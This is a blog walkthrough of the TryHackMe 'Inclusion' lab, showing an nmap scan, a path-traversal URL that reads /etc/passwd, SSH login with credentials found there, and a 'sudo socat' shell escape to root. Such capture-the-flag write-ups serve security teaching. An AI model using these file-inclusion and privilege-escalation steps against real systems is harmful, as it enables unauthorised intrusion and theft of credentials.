---
title: "[TryHackMe] Inclusion - Walkthrough"
date: 2021-04-26T20:44:53+01:00
author: ascrivins
description: "Walkthrough and explanation of the Local File Inclusion vulnerability."
ShowToc: true
ShowBreadCrumbs: true
ShowReadingTime: true
ShowPostNavLinks: true
ShowShareButtons: true
categories: ["TryHackMe"]
tags: ["Walkthrough", "nmap", "Local File Inclusion", "ssh", "Privilege Escalation"]
cover:
   image: "/post_images/inclusion/banner.png"
---

# Intro
A walkthrough of the room Inclusion from TryHackMe.

Link to Room: https://tryhackme.com/room/inclusion

-----------------

# Reconnaissance  
## Scanning 
The first thing to do with an IP is perform an nmap scan to see the open ports and services running on the machine. 

    └─$ nmap -sC -sV [ip]   
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 20:07 BST
    Nmap scan report for [ip]
    Host is up (0.053s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
    |   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
    |_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
    80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
    |_http-server-header: Werkzeug/0.16.0 Python/3.6.9
    |_http-title: My blog
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

So we have an SSH server on port 22 and a http server on port 80. Next step is to look at the webpage. 

----------------

## Webpage
The webpage looks like this:

![webpage](/post_images/inclusion/webpage.png)

It is obvious from the room name and the content of this homepage that we are going to exploit a local file inclusion. 

This is where the name of the file presented to the user is taken from a parameter the user can control. Often this is a URL parameter so checking the links on this homepage we can find a possible exploit. 


Here on this homepage, we can find the link: [ip]/article?name=hacking by clicking on one of the "View Details" buttons. This looks to be vulnerable. 

--------------

# Exploitation 
## Local File Inclusion 
Simply changing the location of the file by the URL: [ip]/article?name=../../../../etc/passwd we get out the contents of the sensitive /etc/passwd file on the machine.

![webpage](/post_images/inclusion/passwd.png)

Organising this in a notepad, we find some credentials with the username, falconfeast:

![webpage](/post_images/inclusion/organised-passwd.png)

--------------------

## SSH Login
We can use these credentials to login through SSH:

    └─$ ssh falconfeast@[ip]     
    The authenticity of host '[ip]' can't be established.
    ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added '[ip]' (ECDSA) to the list of known hosts.
    falconfeast@[ip]'s password: 
    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
      System information as of Tue Apr 27 00:41:29 IST 2021
    
      System load:  0.17              Processes:           86
      Usage of /:   34.8% of 9.78GB   Users logged in:     0
      Memory usage: 64%               IP address for eth0: [ip]
      Swap usage:   0%
    
    
     * Canonical Livepatch is available for installation.
       - Reduce system reboots and improve kernel security. Activate at:
         https://ubuntu.com/livepatch
    
    3 packages can be updated.
    3 updates are security updates.
    
    
    Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
    falconfeast@inclusion:~$ 

----------------

## User Flag
The user flag can then be found in the home directory and cat'd out:

    falconfeast@inclusion:~$ ls
    articles  user.txt
    falconfeast@inclusion:~$ cat user.txt
    60989655[Redacted]

--------------------

# Privilege Escalation
## Sudo -l 
The first check for privilege escalation is the sudo permissions list. This gives us a list of commands we can run as root and leverage our position. 

    falconfeast@inclusion:~$ sudo -l
    Matching Defaults entries for falconfeast on inclusion:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User falconfeast may run the following commands on inclusion:
        (root) NOPASSWD: /usr/bin/socat

------------------

## Socat Shell
We can find out how to leverage this socat command by taking a look at GTFOBins. This listing is what we want to do:

![GTFOBins](/post_images/inclusion/gtfobins.png)

---------------

## Root Flag 
Perfoming this exploit then allows us to create a root shell. 

> **Note:** The GTFOBins listing says that this will not create a proper TTY shell so that is why there is no prompt. 

    falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
    whoami
    root
    cat /root/root.txt
    4296410[Redacted]

-------------